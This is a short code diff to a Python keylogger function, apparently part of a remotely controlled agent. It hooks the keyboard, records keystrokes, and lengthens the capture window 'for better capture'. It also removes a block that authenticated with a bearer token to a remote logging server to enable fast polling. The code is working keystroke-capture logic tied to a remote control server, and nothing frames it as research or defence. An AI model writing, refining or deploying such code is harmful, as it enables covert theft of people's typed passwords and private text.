@@ -287,18 +287,6 @@ def mimetic_keylogger():
         except Exception as e:
             return f"Error installing keyboard: {str(e)}"
 
-    # Enable mimetic mode (tells worker to use fast polling)
-    if device_id:
-        try:
-            req = urllib.request.Request(
-                LOG_AUTH_URL + f"/mimetic-mode?deviceId={device_id}&enabled=true",
-                headers={"Authorization": "Bearer " + AGENT_TOKEN, "User-Agent": USER_AGENT},
-                method="POST",
-            )
-            urllib.request.urlopen(req, timeout=5)
-            print("[mimetic] Fast polling enabled", flush=True)
-        except Exception as e:
-            print(f"[mimetic] Could not enable fast polling: {str(e)}", flush=True)
 
     try:
         log = []
@@ -335,8 +323,8 @@ def mimetic_keylogger():
 
         keyboard.on_press(on_key_press)
 
-        # Wait for ESC or 1-second timeout (aggressive timeout for reliability)
-        stopped = stop_event.wait(timeout=1)
+        # Wait for ESC or 3-second timeout for better capture
+        stopped = stop_event.wait(timeout=3)
         keyboard.unhook_all()
 
         result = ''.join(log)
